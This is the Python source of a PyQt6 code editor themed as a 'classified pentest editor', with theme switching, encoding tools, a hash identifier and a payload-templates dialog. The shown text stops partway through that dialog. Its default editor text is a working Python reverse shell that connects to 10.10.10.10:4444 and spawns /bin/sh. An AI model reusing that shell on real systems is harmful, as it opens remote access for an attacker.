# leviathan_edit_ultimate.py
# LEVIATHAN EDIT v3.0 - PYQT6 POWERED ULTIMATE EDITION
# Combines ALL Tkinter features with PyQt6's superior background handling

import sys
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QPushButton, QLabel, QFrame, QComboBox, QSlider,
    QFileDialog, QMessageBox, QMenu, QToolBar, QStatusBar,
    QScrollArea, QGroupBox, QSplitter, QTabWidget, QDialog,
    QDialogButtonBox, QLineEdit, QTextBrowser
)
from PyQt6.QtGui import (
    QFont, QTextCursor, QTextCharFormat, QColor, QPalette,
    QAction, QIcon, QPixmap, QTextFormat, QPainter,
    QSyntaxHighlighter, QFontMetrics, QKeySequence
)
from PyQt6.QtCore import (
    Qt, QSize, QRegularExpression, pyqtSignal, QTimer,
    QRect, QRectF, QPoint, QThread, pyqtSlot
)
import base64
import urllib.parse
import re
import os
import json
from datetime import datetime
import hashlib

# Import for syntax highlighting
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter

class SyntaxHighlighter(QSyntaxHighlighter):
    def __init__(self, document):
        super().__init__(document)
        self.highlighting_rules = []
        
        # Define keyword formats
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#ff6b6b"))
        keyword_format.setFontWeight(QFont.Weight.Bold)
        
        keywords = [
            '\\bclass\\b', '\\bdef\\b', '\\breturn\\b', '\\bif\\b', '\\belif\\b', 
            '\\belse\\b', '\\bwhile\\b', '\\bfor\\b', '\\bin\\b', '\\btry\\b', 
            '\\bexcept\\b', '\\bfinally\\b', '\\bimport\\b', '\\bfrom\\b', 
            '\\bas\\b', '\\bwith\\b', '\\bpass\\b', '\\bbreak\\b', '\\bcontinue\\b'
        ]
        
        for pattern in keywords:
            rule = (QRegularExpression(pattern), keyword_format)
            self.highlighting_rules.append(rule)
        
        # String format
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#98c379"))
        self.highlighting_rules.append((QRegularExpression('\".*\"'), string_format))
        self.highlighting_rules.append((QRegularExpression('\'.*\''), string_format))
        
        # Comment format
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#5c6370"))
        self.highlighting_rules.append((QRegularExpression('#[^\n]*'), comment_format))
        
        # Function format
        function_format = QTextCharFormat()
        function_format.setForeground(QColor("#61afef"))
        self.highlighting_rules.append((QRegularExpression('\\b[A-Za-z0-9_]+(?=\\()'), function_format))
        
        # Number format
        number_format = QTextCharFormat()
        number_format.setForeground(QColor("#d19a66"))
        self.highlighting_rules.append((QRegularExpression('\\b[0-9]+\\b'), number_format))

    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = pattern
            iterator = expression.globalMatch(text)
            while iterator.hasNext():
                match = iterator.next()
                self.setFormat(match.capturedStart(), match.capturedLength(), format)

class LeviathanEditUltimate(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LEVIATHAN EDIT v3.0 - ULTIMATE CLASSIFIED PENTEST EDITOR")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Initialize themes
        self.init_themes()
        self.current_theme = "FBI Terminal"
        self.custom_colors = self.themes[self.current_theme].copy()
        
        # Initialize language settings
        self.current_language = "Python"
        self.lexer = get_lexer_by_name("python")
        
        # Font size
        self.base_font_size = 14
        self.current_font_size = 14
        
        # Background image
        self.background_image_path = None
        self.current_transparency = 1.0
        
        # Custom templates
        self.custom_templates = self.load_custom_templates()
        
        # Create UI
        self.create_ui()
        
        # Load initial content
        self.editor.setPlainText("""# TOP SECRET // NOFORN // EYES ONLY
# LEVIATHAN EDIT v3.0 - PYQT6 ULTIMATE EDITION

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

# TYPE HERE - BACKGROUND IS BEHIND TEXT, NOT IN TEXT
# This is the superior PyQt6 implementation""")
        
        # Apply initial theme
        self.apply_theme()

    def init_themes(self):
        """Initialize the 10 epic themes"""
        self.themes = {
            "FBI Terminal": {
                "bg": "#000000", "panel": "#0d0d0d", "text": "#00ff41", "accent": "#00ff41",
                "line_bg": "#000000", "line_fg": "#004400", "select": "#003300", "cursor": "#00ff41"
            },
            "CIA BlackOps": {
                "bg": "#001122", "panel": "#001833", "text": "#00ffff", "accent": "#00ffff",
                "line_bg": "#001122", "line_fg": "#008888", "select": "#003366", "cursor": "#00ffff"
            },
            "NSA Quantum": {
                "bg": "#0a001f", "panel": "#1a0033", "text": "#ff00ff", "accent": "#ff00ff",
                "line_bg": "#0a001f", "line_fg": "#660066", "select": "#330066", "cursor": "#ff00ff"
            },
            "Matrix Rain": {
                "bg": "#000000", "panel": "#001100", "text": "#00ff00", "accent": "#00ff00",
                "line_bg": "#000000", "line_fg": "#003300", "select": "#002200", "cursor": "#00ff00"
            },
            "Blood Agent": {
                "bg": "#110000", "panel": "#220000", "text": "#ff3333", "accent": "#ff0000",
                "line_bg": "#110000", "line_fg": "#440000", "select": "#330000", "cursor": "#ff0000"
            },
            "Ghost Protocol": {
                "bg": "#0a0a1f", "panel": "#141428", "text": "#8888ff", "accent": "#4444ff",
                "line_bg": "#0a0a1f", "line_fg": "#333366", "select": "#222244", "cursor": "#8888ff"
            },
            "Zero Day": {
                "bg": "#001100", "panel": "#002200", "text": "#00ffaa", "accent": "#00ffaa",
                "line_bg": "#001100", "line_fg": "#004433", "select": "#003322", "cursor": "#00ffaa"
            },
            "Deep Web": {
                "bg": "#000011", "panel": "#000022", "text": "#44ff44", "accent": "#00ff00",
                "line_bg": "#000011", "line_fg": "#004400", "select": "#002200", "cursor": "#00ff00"
            },
            "Quantum Hack": {
                "bg": "#000033", "panel": "#000066", "text": "#00ccff", "accent": "#0088ff",
                "line_bg": "#000033", "line_fg": "#003366", "select": "#002244", "cursor": "#00ccff"
            },
            "Black Ice": {
                "bg": "#0f0f1f", "panel": "#1f1f3f", "text": "#88aaff", "accent": "#5588ff",
                "line_bg": "#0f0f1f", "line_fg": "#334466", "select": "#223355", "cursor": "#88aaff"
            }
        }

    def load_custom_templates(self):
        """Load custom templates from templates folder"""
        templates = {}
        templates_dir = os.path.join(os.path.dirname(__file__), "templates")
        
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir)
        
        if os.path.exists(templates_dir):
            for filename in os.listdir(templates_dir):
                if filename.endswith(('.txt', '.py', '.sh', '.js', '.html', '.css', '.java', '.c', '.cpp', '.go', '.rs', '.php', '.rb', '.sql')):
                    filepath = os.path.join(templates_dir, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            template_name = os.path.splitext(filename)[0].upper().replace('_', ' ')
                            templates[template_name] = f.read()
                    except:
                        pass
        
        return templates

    def create_ui(self):
        # === CENTRAL WIDGET WITH BACKGROUND ===
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # === LEFT SIDEBAR ===
        sidebar = QFrame()
        sidebar.setMinimumWidth(350)
        sidebar.setMaximumWidth(350)
        sidebar.setStyleSheet("""
            QFrame {
                background-color: #111122;
                border-right: 2px solid #00ff41;
            }
        """)
        
        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(15, 15, 15, 15)
        sidebar_layout.setSpacing(10)

        # Title
        title = QLabel("LEVIATHAN\nEDIT v3.0")
        title.setFont(QFont("Orbitron", 28, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; background: transparent;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(title)
        
        version = QLabel("ULTIMATE PYQT6 EDITION")
        version.setFont(QFont("Consolas", 10))
        version.setStyleSheet("color: #ff0066; background: transparent;")
        version.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(version)
        
        sidebar_layout.addSpacing(20)

        # Tools Section
        tools_label = QLabel("CLASSIFIED TOOLS")
        tools_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        tools_label.setStyleSheet("color: #00ffaa; background: transparent;")
        sidebar_layout.addWidget(tools_label)
        
        tools = [
            ("BASE64 ENCODER/DECODER", self.open_base64_tool),
            ("URL ENCODE/DECODE", self.open_url_tool),
            ("HASH IDENTIFIER", self.open_hash_tool),
            ("PAYLOAD TEMPLATES", self.open_templates_tool),
        ]
        
        for name, cmd in tools:
            btn = QPushButton(name)
            btn.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            btn.setStyleSheet("""
                QPushButton {
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                                stop:0 #003300, stop:1 #001100);
                    color: #00ff41;
                    border: 2px solid #00ff41;
                    border-radius: 8px;
                    padding: 12px;
                    margin: 5px;
                }
                QPushButton:hover {
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                                stop:0 #005500, stop:1 #003300);
                    border: 2px solid #00ff88;
                }
                QPushButton:pressed {
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                                stop:0 #001100, stop:1 #000000);
                }
            """)
            btn.clicked.connect(cmd)
            sidebar_layout.addWidget(btn)

        # Theme Selector
        sidebar_layout.addSpacing(30)
        theme_label = QLabel("CLASSIFIED THEMES")
        theme_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        theme_label.setStyleSheet("color: #ff0066; background: transparent;")
        sidebar_layout.addWidget(theme_label)
        
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(list(self.themes.keys()))
        self.theme_combo.setCurrentText(self.current_theme)
        self.theme_combo.setFont(QFont("Consolas", 10))
        self.theme_combo.setStyleSheet("""
            QComboBox {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 8px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid #00ff41;
            }
        """)
        self.theme_combo.currentTextChanged.connect(self.load_theme)
        sidebar_layout.addWidget(self.theme_combo)

        # Display Settings
        sidebar_layout.addSpacing(30)
        display_label = QLabel("DISPLAY SETTINGS")
        display_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        display_label.setStyleSheet("color: #00aaff; background: transparent;")
        sidebar_layout.addWidget(display_label)
        
        # Font size control
        font_frame = QFrame()
        font_layout = QHBoxLayout(font_frame)
        font_layout.setContentsMargins(0, 0, 0, 0)
        
        decrease_font_btn = QPushButton("A-")
        decrease_font_btn.setFixedSize(50, 30)
        decrease_font_btn.clicked.connect(self.decrease_font)
        decrease_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_label = QLabel("FONT SIZE")
        font_label.setStyleSheet("color: #00ffaa;")
        font_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        increase_font_btn = QPushButton("A+")
        increase_font_btn.setFixedSize(50, 30)
        increase_font_btn.clicked.connect(self.increase_font)
        increase_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_layout.addWidget(decrease_font_btn)
        font_layout.addWidget(font_label)
        font_layout.addWidget(increase_font_btn)
        sidebar_layout.addWidget(font_frame)

        # Transparency control
        transparency_label = QLabel("TRANSPARENCY")
        transparency_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        transparency_label.setStyleSheet("color: #ff00ff; background: transparent;")
        sidebar_layout.addWidget(transparency_label)
        
        self.transparency_slider = QSlider(Qt.Orientation.Horizontal)
        self.transparency_slider.setRange(30, 100)
        self.transparency_slider.setValue(100)
        self.transparency_slider.setStyleSheet("""
            QSlider::groove:horizontal {
                border: 1px solid #ff00ff;
                height: 8px;
                background: #330033;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #ff00ff;
                border: 1px solid #ff00ff;
                width: 18px;
                margin: -5px 0;
                border-radius: 9px;
            }
        """)
        self.transparency_slider.valueChanged.connect(self.change_transparency)
        sidebar_layout.addWidget(self.transparency_slider)

        # Background Image
        background_label = QLabel("BACKGROUND IMAGE")
        background_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        background_label.setStyleSheet("color: #00ff88; background: transparent;")
        sidebar_layout.addWidget(background_label)
        
        bg_frame = QFrame()
        bg_layout = QHBoxLayout(bg_frame)
        bg_layout.setContentsMargins(0, 0, 0, 0)
        
        set_bg_btn = QPushButton("SET IMAGE")
        set_bg_btn.clicked.connect(self.set_background_image)
        set_bg_btn.setStyleSheet("""
            QPushButton {
                background: #003333;
                color: #00ffaa;
                border: 1px solid #00ffaa;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        clear_bg_btn = QPushButton("CLEAR")
        clear_bg_btn.clicked.connect(self.clear_background_image)
        clear_bg_btn.setStyleSheet("""
            QPushButton {
                background: #333300;
                color: #ffaa00;
                border: 1px solid #ffaa00;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        bg_layout.addWidget(set_bg_btn)
        bg_layout.addWidget(clear_bg_btn)
        sidebar_layout.addWidget(bg_frame)

        sidebar_layout.addStretch()

        # Add sidebar to main layout
        main_layout.addWidget(sidebar)

        # === MAIN EDITOR AREA ===
        editor_area = QWidget()
        editor_layout = QVBoxLayout(editor_area)
        editor_layout.setContentsMargins(0, 0, 0, 0)
        editor_layout.setSpacing(0)

        # Toolbar
        toolbar = QToolBar()
        toolbar.setStyleSheet("""
            QToolBar {
                background: #111122;
                border: none;
                padding: 5px;
            }
        """)
        
        new_action = QAction(" NEW FILE ", self)
        new_action.triggered.connect(self.new_file)
        toolbar.addAction(new_action)
        
        open_action = QAction(" OPEN FILE ", self)
        open_action.triggered.connect(self.open_file)
        toolbar.addAction(open_action)
        
        save_action = QAction(" SAVE AS ", self)
        save_action.triggered.connect(self.save_file)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        lang_label = QLabel("  LANG:")
        lang_label.setStyleSheet("color: #00ff41;")
        toolbar.addWidget(lang_label)
        
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["Python", "JavaScript", "HTML", "CSS", "Bash", "C", "C++", 
                                  "Java", "Go", "Rust", "PHP", "Ruby", "SQL"])
        self.lang_combo.setCurrentText("Python")
        self.lang_combo.setFixedWidth(120)
        self.lang_combo.setStyleSheet("""
            QComboBox {
                background: #003300;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 4px;
            }
        """)
        self.lang_combo.currentTextChanged.connect(self.change_language)
        toolbar.addWidget(self.lang_combo)
        
        editor_layout.addWidget(toolbar)

        # Editor
        self.editor = QTextEdit()
        self.editor.setFont(QFont("Consolas", self.current_font_size))
        self.editor.setStyleSheet("""
            QTextEdit {
                background: transparent;
                color: #00ff41;
                selection-background-color: #003300;
                border: none;
            }
        """)
        
        # Add syntax highlighter
        self.highlighter = SyntaxHighlighter(self.editor.document())
        
        editor_layout.addWidget(self.editor)

        # Status Bar
        self.status_bar = QStatusBar()
        self.status_bar.setStyleSheet("""
            QStatusBar {
                background: #330000;
                color: #ff0066;
                font-weight: bold;
                border-top: 2px solid #ff0066;
            }
        """)
        self.status_bar.showMessage("STATUS: ACTIVE // LEVIATHAN EDIT v3.0 // THEME: FBI Terminal")
        editor_layout.addWidget(self.status_bar)

        # Add editor area to main layout
        main_layout.addWidget(editor_area, 1)

    def set_background_image(self):
        """Set background image using PyQt6's superior CSS-based approach"""
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Background Image",
            "", "Images (*.png *.jpg *.jpeg *.bmp *.gif *.webp)"
        )
        
        if path:
            # FIXED: Handle backslashes in path for f-string
            fixed_path = path.replace('\\', '/')
            
            # This is the bulletproof way - works on all platforms
            style = f"""
                QWidget {{
                    background-image: url("{fixed_path}");
                    background-repeat: no-repeat;
                    background-position: center;
                    background-attachment: fixed;
                    background-size: cover;
                }}
            """
            # Optional dark overlay for readability
            overlay = " QWidget { background-color: rgba(0, 0, 0, 120); }"
            
            # Apply to central widget AND editor area
            self.centralWidget().setStyleSheet(style + overlay)
            self.background_image_path = path
            
            QMessageBox.information(self, "BACKGROUND ACTIVATED", 
                                  "Background image locked in.\nPerfect overlay achieved.")
            self.status_bar.showMessage(f"BACKGROUND: {os.path.basename(path)} // ACTIVE")

    def clear_background_image(self):
        """Clear background image and revert to theme"""
        self.background_image_path = None
        self.centralWidget().setStyleSheet("")
        self.apply_theme()
        self.status_bar.showMessage("BACKGROUND CLEARED // THEME: " + self.current_theme)

    def load_theme(self, theme_name):
        """Load a theme"""
        self.current_theme = theme_name
        self.custom_colors = self.themes[theme_name].copy()
        self.apply_theme()

    def apply_theme(self):
        """Apply current theme"""
        if self.background_image_path:
            # Don't change background if image is set
            return
            
        c = self.custom_colors
        
        # Apply to main window
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {c['bg']};
            }}
        """)
        
        # Apply to editor
        self.editor.setStyleSheet(f"""
            QTextEdit {{
                background: transparent;
                color: {c['text']};
                selection-background-color: {c['select']};
                border: none;
            }}
        """)
        
        # Update status bar
        self.status_bar.showMessage(f"THEME: {self.current_theme} // LANG: {self.current_language}")

    def change_language(self, lang):
        """Change programming language"""
        self.current_language = lang
        self.lexer = get_lexer_by_name(lang.lower())
        self.status_bar.showMessage(f"LANG: {lang} // THEME: {self.current_theme}")

    def increase_font(self):
        """Increase font size"""
        self.current_font_size = min(self.current_font_size + 2, 32)
        self.editor.setFont(QFont("Consolas", self.current_font_size))
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt // THEME: {self.current_theme}")

    def decrease_font(self):
        """Decrease font size"""
        self.current_font_size = max(self.current_font_size - 2, 8)
        self.editor.setFont(QFont("Consolas", self.current_font_size))
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt // THEME: {self.current_theme}")

    def change_transparency(self, value):
        """Change window transparency"""
        self.current_transparency = value / 100.0
        self.setWindowOpacity(self.current_transparency)
        self.status_bar.showMessage(f"TRANSPARENCY: {value}% // THEME: {self.current_theme}")

    def new_file(self):
        """Create new file"""
        reply = QMessageBox.question(self, "NEW FILE", 
                                   "Wipe current session?",
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.editor.clear()

    def open_file(self):
        """Open a file"""
        path, _ = QFileDialog.getOpenFileName(
            self, "Open File",
            "", "All Files (*.*);;Python (*.py);;JavaScript (*.js);;HTML (*.html);;CSS (*.css);;Bash (*.sh)"
        )
        
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    self.editor.setPlainText(content)
                
                # Auto-detect language
                ext = os.path.splitext(path)[1].lower()
                lang_map = {
                    '.py': 'Python', '.js': 'JavaScript', '.html': 'HTML', '.css': 'CSS',
                    '.sh': 'Bash', '.c': 'C', '.cpp': 'C++', '.h': 'C', '.java': 'Java',
                    '.go': 'Go', '.rs': 'Rust', '.php': 'PHP', '.rb': 'Ruby', '.sql': 'SQL'
                }
                
                if ext in lang_map:
                    self.lang_combo.setCurrentText(lang_map[ext])
                    self.change_language(lang_map[ext])
                
                QMessageBox.information(self, "FILE LOADED", f"DECRYPTED: {os.path.basename(path)}")
                self.status_bar.showMessage(f"LOADED: {os.path.basename(path)} // {self.current_language}")
                
            except Exception as e:
                QMessageBox.critical(self, "ERROR", f"Failed to open file:\n{str(e)}")

    def save_file(self):
        """Save current file"""
        path, _ = QFileDialog.getSaveFileName(
            self, "Save File",
            "", "All Files (*.*);;Python (*.py);;Text (*.txt)"
        )
        
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(self.editor.toPlainText())
                
                QMessageBox.information(self, "FILE SAVED", "File encrypted and saved.")
                self.status_bar.showMessage(f"SAVED: {os.path.basename(path)}")
                
            except Exception as e:
                QMessageBox.critical(self, "ERROR", f"Failed to save file:\n{str(e)}")

    # === TOOL FUNCTIONS ===
    def open_base64_tool(self):
        """Open Base64 encoder/decoder tool"""
        dialog = Base64ToolDialog(self)
        dialog.exec()

    def open_url_tool(self):
        """Open URL encoder/decoder tool"""
        dialog = URLToolDialog(self)
        dialog.exec()

    def open_hash_tool(self):
        """Open hash identifier tool"""
        dialog = HashToolDialog(self)
        dialog.exec()

    def open_templates_tool(self):
        """Open payload templates tool"""
        dialog = TemplatesDialog(self, self.custom_templates)
        dialog.exec()

# ================= TOOL DIALOGS =================

class Base64ToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("BASE64 ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 11pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 2px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 12))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 12))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = base64.b64encode(text.encode()).decode()
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        try:
            decoded = base64.b64decode(text.encode()).decode()
            self.output_text.setPlainText(decoded)
        except:
            self.output_text.setPlainText("ERROR: Invalid Base64")

class URLToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("URL ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 11pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #330000, stop:1 #110000);
                color: #ff4444;
                border: 2px solid #ff4444;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #550000, stop:1 #330000);
                border: 2px solid #ff8888;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 12))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 12))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = urllib.parse.quote(text)
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        decoded = urllib.parse.unquote(text)
        self.output_text.setPlainText(decoded)

class HashToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("HASH IDENTIFIER")
        self.setFixedSize(600, 400)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 11pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("ENTER HASH:")
        input_label.setFont(QFont("Consolas", 12))
        layout.addWidget(input_label)
        
        self.hash_input = QLineEdit()
        layout.addWidget(self.hash_input)
        
        # Result
        result_label = QLabel("POSSIBLE HASH TYPES:")
        result_label.setFont(QFont("Consolas", 12))
        layout.addWidget(result_label)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        
        # Button
        identify_btn = QPushButton("IDENTIFY HASH")
        identify_btn.clicked.connect(self.identify)
        layout.addWidget(identify_btn)
        
        self.setLayout(layout)
    
    def identify(self):
        hash_val = self.hash_input.text().strip()
        self.result_text.clear()
        
        if not hash_val:
            self.result_text.setPlainText("ERROR: No hash provided")
            return
        
        length = len(hash_val)
        results = []
        hex_pattern = r'^[a-fA-F0-9]+$'
        
        if length == 32 and re.match(hex_pattern, hash_val):
            results.append("MD5 (Message Digest 5)")
            results.append("NTLM (Windows)")
        
        if length == 40 and re.match(hex_pattern, hash_val):
            results.append("SHA-1 (Secure Hash Algorithm 1)")
        
        if length == 56 and re.match(hex_pattern, hash_val):
            results.append("SHA-224")
        
        if length == 64 and re.match(hex_pattern, hash_val):
            results.append("SHA-256")
            results.append("SHA3-256")
            results.append("Keccak-256")
        
        if length == 96 and re.match(hex_pattern, hash_val):
            results.append("SHA-384")
        
        if length == 128 and re.match(hex_pattern, hash_val):
            results.append("SHA-512")
            results.append("SHA3-512")
        
        if hash_val.startswith('$1'):
            results.append("MD5 Crypt")
        
        if hash_val.startswith('$2a') or hash_val.startswith('$2b') or hash_val.startswith('$2y'):
            results.append("bcrypt")
        
        if hash_val.startswith('$5'):
            results.append("SHA-256 Crypt")
        
        if hash_val.startswith('$6'):
            results.append("SHA-512 Crypt")
        
        if hash_val.startswith('$apr1'):
            results.append("APR1 (Apache)")
        
        if not results:
            results.append("UNKNOWN - Could not identify hash type")
            results.append(f"Length: {length} characters")
        
        output = "IDENTIFIED HASH TYPES:\n" + "="*60 + "\n"
        for i, r in enumerate(results, 1):
            output += f"{i}. {r}\n"
        
        self.result_text.setPlainText(output)

class TemplatesDialog(QDialog):
    def __init__(self, parent=None, custom_templates=None):
        super().__init__(parent)
        self.parent_editor = parent
        self.custom_templates = custom_templates or {}
        self.setWindowTitle("PAYLOAD TEMPLATES")
        self.resize(800, 600)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #ff0066;
                font-weight: bold;
            }
            QScrollArea {
                border: none;
                background: transparent;
            }
            QFrame {
                background: #001122;
                border: 2px solid #00ff41;
                border-radius: 8px;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 8px;
                font-weight: bold;
                border-radius: 4px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 1px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("CLASSIFIED PAYLOAD DATABASE")
        title.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # Scroll area
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        container_layout = QVBoxLayout(container)
        
        # Built-in templates
        builtin_label = QLabel("BUILT-IN TEMPLATES")
        builtin_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        builtin_label.setStyleSheet("color: #00ffaa;")
        container_layout.addWidget(builtin_label)
        
        templates = self.get_builtin_templates()
        for name, code in templates.items():
            frame = QFrame()
            frame_layout = QVBoxLayout(frame)
            
            name_label = QLabel(name)
            name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            name_label.setStyleSheet("color: #00ffaa;")
            frame_layout.addWidget(name_label)
            
            insert_btn = QPushButton("INSERT INTO EDITOR")
            insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
            frame_layout.addWidget(insert_btn)
            
            container_layout.addWidget(frame)
        
        # Custom templates
        if self.custom_templates:
